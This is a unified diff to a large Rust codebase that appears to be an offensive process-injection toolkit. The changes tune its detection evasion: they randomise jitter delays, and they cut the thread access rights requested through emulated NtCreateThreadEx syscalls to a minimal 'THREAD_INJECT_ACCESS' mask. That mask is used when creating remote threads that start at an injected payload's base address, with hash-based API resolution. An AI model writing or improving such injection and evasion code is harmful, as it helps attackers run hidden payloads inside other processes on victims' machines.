@@ -26,6 +26,7 @@
 
 use anyhow::{anyhow, Result};
 use rand::RngCore;
+use rand::Rng;
 use std::ffi::c_void;
 
 // ── Error types ──────────────────────────────────────────────────────────────
@@ -1970,7 +1971,7 @@ fn try_technique_evasive(
 
 /// Sleep for a random duration between 0 and `max_ms` milliseconds.
 fn jitter_delay(max_ms: u64) {
-    let delay = rand::random::<u64>() % max_ms;
+    let delay = rand::thread_rng().gen_range(0..max_ms);
     if delay > 0 {
         std::thread::sleep(std::time::Duration::from_millis(delay));
     }
@@ -7033,6 +7034,9 @@ const PROCESS_READWRITE_VM: u32 = 0x6A; // 106
 /// Some builds expose this instead of or in addition to ProcessReadWriteVm.
 const PROCESS_VM_OPERATION_CLASS: u32 = 0x6B; // 107
 
+/// Minimal thread access for injection: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
+const THREAD_INJECT_ACCESS: u64 = 0x1A02;
+
 /// Input structure for ProcessReadWriteVm information class.
 /// Matches the kernel's _PROCESS_READWRITEVM_LAYOUT structure.
 #[repr(C)]
@@ -7362,7 +7366,7 @@ unsafe fn inject_nt_set_info_process(
     let status = emulated_syscall!(
         "NtCreateThreadEx",
         &mut h_thread as *mut _ as u64,
-        0x1FFFFFu64, // THREAD_ALL_ACCESS
+        THREAD_INJECT_ACCESS, // minimal thread access
         0u64,        // ObjectAttributes (NULL)
         h_proc,
         base_addr as u64, // StartAddress = payload base
@@ -9787,7 +9791,8 @@ unsafe fn create_suspended_thread(
     start_addr: usize,
 ) -> Result<*mut c_void, InjectionError> {
     const CREATE_SUSPENDED: u32 = 0x00000004;
-    const THREAD_ALL_ACCESS: u32 = 0x001FFFFF; // will be reduced by CSRSS
+    /// Minimal thread access for injection: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
+    const THREAD_INJECT_ACCESS: u32 = 0x1A02;
 
     // Resolve NtCreateThreadEx via pe_resolve.
     let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
@@ -9824,7 +9829,7 @@ unsafe fn create_suspended_thread(
     let mut h_thread: *mut c_void = std::ptr::null_mut();
     let status = nt_create_thread(
         &mut h_thread,
-        THREAD_ALL_ACCESS,
+        THREAD_INJECT_ACCESS,
         std::ptr::null_mut(),
         h_proc,
         start_addr as *mut c_void,
